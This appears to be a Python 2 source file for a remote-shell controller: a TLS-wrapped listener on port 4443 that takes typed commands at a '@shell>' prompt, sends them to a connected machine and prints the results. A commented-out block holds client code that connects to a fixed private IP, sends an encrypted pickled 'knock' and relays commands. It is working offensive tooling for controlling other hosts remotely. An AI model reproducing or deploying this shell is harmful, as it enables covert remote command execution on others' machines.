import os, socket, sys
import ssl
import threading

hostname = "webshell"
KEYFILE = 'server.key'
CERTFILE = 'server.cert'


def sock_create():
    try:
        global s
        global host
        global port
        global sock
        host = ''
        port = 4443
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = ssl.wrap_socket(sock, keyfile=KEYFILE, certfile=CERTFILE, server_side=True)
        print("Binding Port ... ")
        s.bind((host, port))
        s.listen(10)
    except socket.error as msg:
        print("socket error : " + str(msg[0]))


def sock_accept():
    global conn
    global addr
    global hostname
    try:
        print ("New thread")
        conn, addr = s.accept()
        print ("connecton from %s:%s" % (addr[0], addr[1]))
        print("\n")
        # hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print (msg)


def menu():
    while 1:
        command = raw_input(str(addr[0]) + '@shell>')
        if command == "quit" or command == 'exit':
            conn.close()
            s.close()
            sys.exit()
        cmd = conn.send(command)
        result = conn.recv(16384)
        if result :
            print (result)


def main():
    sock_create()
    sock_accept()


main()
"""
import socket
import ssl
from encrypt import *
import pickle


def connect(command_to_run, ip):
    try:
        global host
        global port
        global s
        global sock
        global result
        global command

        command = command_to_run

        host = '172.16.69.132'
        # host = ''
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
        print("Trying to Connect")
        s.connect((host, port))
        print("Connection Established")
        knock = encrypt_message()
        s.send(pickle.dumps(knock))
        time.sleep(1)
        return receive()
    except socket.error as msg:
        return "socket error : " + str(msg[0])


def receive():
    if command == 'quit' or command == 'exit':
        s.close()
    else:
        return send(command)


def send(args):
    s.send(args)
    result = s.recv(16384)
    print(result)
    s.close()
    return str(result)
"""


